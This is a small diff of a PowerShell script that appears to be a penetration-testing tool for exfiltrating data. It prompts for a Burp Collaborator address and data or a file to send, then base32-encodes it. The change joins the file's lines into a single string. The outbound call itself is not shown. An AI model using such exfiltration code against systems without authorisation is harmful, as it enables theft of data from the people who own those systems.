@@ -26,7 +26,7 @@ $collabDomain = Read-Host -Prompt 'Burp Collaborator address'
 if (-not $exfilFile) {
   $exfilData = Read-Host -Prompt 'Data to exfiltrate'
 } else {
-  $exfilData = Get-Content $exfilFile
+  $exfilData = Get-Content $exfilFile | Out-String
 }
 #Convert data to base32
 $exfilData = Encode-Base32 $exfilData
